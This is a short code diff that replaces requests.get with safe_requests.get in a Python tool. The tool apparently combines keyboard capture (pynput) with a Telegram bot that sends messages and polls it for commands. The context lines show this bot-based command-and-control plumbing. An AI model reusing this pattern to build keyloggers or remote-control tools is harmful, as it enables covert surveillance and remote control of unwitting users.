@@ -23,6 +23,7 @@ from colorama import Fore, Back, Style
 # from telegram.ext import Application, CommandHandler, ContextTypes
 from pynput import keyboard
 from cryptography.fernet import Fernet
+from security import safe_requests
 
 userIp  = ''
 userLocation = ''
@@ -106,7 +107,7 @@ class TeleManager():
         url = f'https://api.telegram.org/bot{self.token}/sendmessage?chat_id={self.userId}&text={msg}'
         
         try:
-            response = requests.get(url)
+            response = safe_requests.get(url)
             if response.status_code == 200:
                 print(Fore.LIGHTGREEN_EX + '[+] Message Sender => Message Sent Successfully on Normal Mode!'+Style.RESET_ALL)
                 return True
@@ -240,7 +241,7 @@ class TeleManager():
         url = f'https://api.telegram.org/bot{self.token}/getUpdates'
         
         try:
-            response = requests.get(url)
+            response = safe_requests.get(url)
             if response.status_code == 200:
                 lastCmd = response.json()['result'][-1]['message']['text']
                 print(Fore.LIGHTGREEN_EX+f'[+] Last Command => from Bot: {lastCmd}'+Style.RESET_ALL)
